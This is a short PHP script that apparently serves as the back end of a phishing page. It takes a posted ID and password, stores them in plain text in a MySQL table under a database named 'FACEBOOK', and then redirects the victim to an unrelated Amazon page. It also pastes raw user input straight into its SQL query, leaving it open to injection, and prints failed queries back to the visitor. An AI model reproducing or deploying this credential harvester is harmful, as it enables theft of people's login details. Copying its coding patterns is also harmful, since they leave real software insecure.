<?php
    $servername='localhost';
    $username='root';
    $password='';
    $dbname = "FACEBOOK";
    $conn = mysqli_connect($servername,$username,$password,"$dbname");
      if(!$conn){
          die('Could not Connect to Server:' .mysql_error());
        }
  
     $id = $_POST['id'];
     $pass = $_POST['pass'];
    
     $sql = "INSERT INTO ACCOUNTS (ID,PASSWORD)
     VALUES ('$id','$pass')";
     if (mysqli_query($conn, $sql)) {
         header('Location: https://www.amazon.com/b?node=16225016011&pf_rd_r=QEFN064BJCSZ8KZK6QAJ&pf_rd_p=e5b0c85f-569c-4c90-a58f-0c0a260e45a0&pd_rd_r=0dfadc9e-7487-43d0-bbd2-847b31ca4092&pd_rd_w=Zeogr&pd_rd_wg=VMrl1&ref_=pd_gw_unk');
     } else {
        echo "Error: " . $sql . ":-" . mysqli_error($conn);
     }
     mysqli_close($conn);
?>